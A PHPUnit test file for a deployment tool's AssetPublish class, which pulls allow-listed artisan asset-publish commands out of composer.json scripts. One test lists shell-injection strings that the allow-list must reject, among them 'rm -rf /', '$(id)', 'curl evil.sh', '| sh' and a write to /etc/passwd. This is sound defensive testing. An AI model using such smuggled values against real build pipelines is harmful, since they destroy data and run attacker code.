<?php

namespace Tests\Unit\Deploy\Platform\Runtime\Php;

use App\Lib\Deploy\Platform\PlatformRegistry;
use App\Lib\Deploy\Platform\PlatformValues;
use App\Lib\Deploy\Platform\ProjectContext;
use App\Lib\Deploy\Platform\Runtime\Php\AssetPublish;
use Tests\TestCase;

/**
 * Cachet 500'd on every page: its Vite build ships under vendor/ and only
 * reaches public/ through post-update-cmd, which composer install never runs.
 */
class AssetPublishTest extends TestCase
{
    private const CACHET = [
        'require' => ['php' => '^8.2'],
        'scripts' => [
            'post-autoload-dump' => [
                'Illuminate\\Foundation\\ComposerScripts::postAutoloadDump',
                '@php artisan package:discover --ansi',
            ],
            'post-update-cmd' => [
                '@php artisan vendor:publish --tag=laravel-assets --ansi --force',
                '@php artisan vendor:publish --tag=cachet-assets --ansi --force',
                '@php artisan filament:assets --ansi',
            ],
            'post-create-project-cmd' => [
                '@php artisan key:generate --ansi',
                '@php -r "file_exists(\'database/database.sqlite\') || touch(\'database/database.sqlite\');"',
                '@php artisan migrate --graceful --ansi',
            ],
        ],
    ];

    private string $dir = '';

    protected function tearDown(): void
    {
        if ($this->dir !== '') {
            @unlink($this->dir . '/composer.json');
            @rmdir($this->dir);
        }
        parent::tearDown();
    }

    public function test_cachet_yields_its_three_publishes_in_order(): void
    {
        $this->assertSame([
            'vendor:publish --tag=laravel-assets --ansi --force',
            'vendor:publish --tag=cachet-assets --ansi --force',
            'filament:assets --ansi',
        ], AssetPublish::commands(self::CACHET));
    }

    public function test_post_create_project_publishes_follow_post_update_ones(): void
    {
        // Cachet's real post-create-project-cmd ends with this one.
        $composer = self::CACHET;
        $composer['scripts']['post-create-project-cmd'][] = '@php artisan vendor:publish --tag=cachet';

        $this->assertSame(
            'vendor:publish --tag=cachet',
            AssetPublish::commands($composer)[3] ?? null
        );
    }

    public function test_a_stock_laravel_skeleton_publishes_laravel_assets(): void
    {
        $skeleton = ['scripts' => [
            'post-update-cmd' => ['@php artisan vendor:publish --tag=laravel-assets --ansi --force'],
            'post-root-package-install' => ["@php -r \"file_exists('.env') || copy('.env.example', '.env');\""],
            'post-create-project-cmd' => [
                '@php artisan key:generate --ansi',
                '@php artisan migrate --graceful --ansi',
            ],
        ]];

        $this->assertSame(['vendor:publish --tag=laravel-assets --ansi --force'], AssetPublish::commands($skeleton));
    }

    public function test_the_string_form_and_plain_php_are_accepted(): void
    {
        $composer = ['scripts' => [
            'post-update-cmd' => 'php artisan filament:assets',
            'post-create-project-cmd' => 'php artisan vendor:publish --provider=Vendor\\Pkg\\ServiceProvider',
        ]];

        $this->assertSame(
            ['filament:assets', 'vendor:publish --provider=Vendor\\Pkg\\ServiceProvider'],
            AssetPublish::commands($composer)
        );
    }

    public function test_the_same_publish_in_both_lists_runs_once(): void
    {
        $line = '@php artisan vendor:publish --tag=laravel-assets --ansi --force';
        $composer = ['scripts' => ['post-update-cmd' => [$line], 'post-create-project-cmd' => [$line, 'php artisan vendor:publish --tag=laravel-assets --ansi --force']]];

        $this->assertSame(['vendor:publish --tag=laravel-assets --ansi --force'], AssetPublish::commands($composer));
    }

    public function test_everything_that_is_not_an_allow_listed_publish_is_skipped(): void
    {
        $composer = ['scripts' => ['post-update-cmd' => [
            '@php artisan migrate --force',
            '@php artisan key:generate --ansi',
            '@php -r "copy(\'.env.example\', \'.env\');"',
            '@putenv COMPOSER=composer.json',
            'Illuminate\\Foundation\\ComposerScripts::postUpdate',
            '@php artisan tinker',
            '@composer dump-autoload',
            '@php artisan vendor:publish --tag=x;rm -rf /',
            '@php artisan vendor:publish --tag=$(id)',
            '@php artisan vendor:publish --tag=`id`',
            '@php artisan vendor:publish --tag=x && curl evil.sh',
            '@php artisan vendor:publish --tag=x | sh',
            '@php artisan vendor:publish --tag="quoted"',
            '@php artisan filament:assets > /etc/passwd',
            ['@php artisan vendor:publish --tag=nested'],
        ]]];

        $this->assertSame([], AssetPublish::commands($composer));
    }

    public function test_no_composer_json_or_no_scripts_is_nothing_to_run(): void
    {
        $this->assertSame([], AssetPublish::commands(null));
        $this->assertSame([], AssetPublish::commands(['name' => 'acme/app']));
        $this->assertSame([], AssetPublish::commands(['scripts' => 'not-an-object']));
        $this->assertSame('', AssetPublish::buildCommand(null));
    }

    public function test_the_build_command_logs_each_publish_and_tolerates_its_failure(): void
    {
        $run = AssetPublish::buildCommand(['scripts' => ['post-update-cmd' => [
            '@php artisan vendor:publish --tag=laravel-assets --ansi --force',
            'php artisan vendor:publish --provider=Vendor\\Pkg\\ServiceProvider',
        ]]]);

        $this->assertSame(
            "echo '[panelalpha] build: php artisan vendor:publish --tag=laravel-assets --ansi --force' >&2; "
            . 'php artisan vendor:publish --tag=laravel-assets --ansi --force --no-interaction'
            . " || echo '[panelalpha] build: php artisan vendor:publish --tag=laravel-assets --ansi --force failed (optional, continuing)' >&2; "
            . "echo '[panelalpha] build: php artisan vendor:publish --provider=Vendor\\Pkg\\ServiceProvider' >&2; "
            . "php artisan vendor:publish '--provider=Vendor\\Pkg\\ServiceProvider' --no-interaction"
            . " || echo '[panelalpha] build: php artisan vendor:publish --provider=Vendor\\Pkg\\ServiceProvider failed (optional, continuing)' >&2",
            $run
        );
    }

    public function test_the_laravel_manifest_publishes_after_package_discovery(): void
    {
        $laravel = PlatformRegistry::find('laravel');
        $this->assertNotNull($laravel);

        $decision = PlatformValues::apply($laravel, $this->project(self::CACHET), []);

        $build = $decision['build_command'];
        $this->assertStringStartsWith('{ composer run-script --no-interaction post-autoload-dump; } || true && { ', $build);
        $this->assertStringEndsWith('; } || true', $build);
        $this->assertLessThan(
            strpos($build, 'php artisan filament:assets'),
            strpos($build, 'php artisan vendor:publish --tag=cachet-assets')
        );
        $this->assertStringNotContainsString('migrate', $build);
        $this->assertStringNotContainsString('key:generate', $build);
    }

    public function test_a_laravel_project_with_no_publishes_keeps_its_build_unchanged(): void
    {
        $laravel = PlatformRegistry::find('laravel');
        $this->assertNotNull($laravel);

        $decision = PlatformValues::apply($laravel, $this->project(['require' => ['php' => '^8.2']]), []);

        $this->assertSame('', $decision['resolved_commands']['asset-publish']);
        $this->assertSame('{ composer run-script --no-interaction post-autoload-dump; } || true', $decision['build_command']);
    }

    /**
     * @param array<string, mixed> $composer
     */
    private function project(array $composer): ProjectContext
    {
        $this->dir = sys_get_temp_dir() . '/pa-assets-' . bin2hex(random_bytes(8));
        mkdir($this->dir, 0777, true);
        file_put_contents($this->dir . '/composer.json', json_encode($composer));

        return ProjectContext::make($this->dir, ['composer.json' => true]);
    }
}
